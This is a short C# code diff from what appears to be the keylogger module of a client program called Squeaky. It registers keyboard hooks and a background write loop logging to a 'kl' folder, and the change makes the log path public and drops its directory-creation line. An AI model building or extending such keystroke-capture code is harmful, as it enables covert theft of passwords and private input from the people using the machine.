@@ -19,7 +19,7 @@ namespace Squeaky.Client.Utilities
         private static bool FirstLine = true;
         private static bool CtrlPressed = false;
 
-        private static string LogDir = @"kl\";
+        public static string LogDir = @"kl\";
 
         private static void WriteLoop()
         {
@@ -92,8 +92,6 @@ namespace Squeaky.Client.Utilities
                 hook.KeyDown += OnKeyDown;
                 hook.KeyUp += OnKeyUp;
                 hook.KeyPress += OnKeyPress;
-
-                if (!Directory.Exists(LogDir)) Directory.CreateDirectory(LogDir);
 
                 Thread WriteLoopThread = new Thread(WriteLoop);
                 WriteLoopThread.Start();
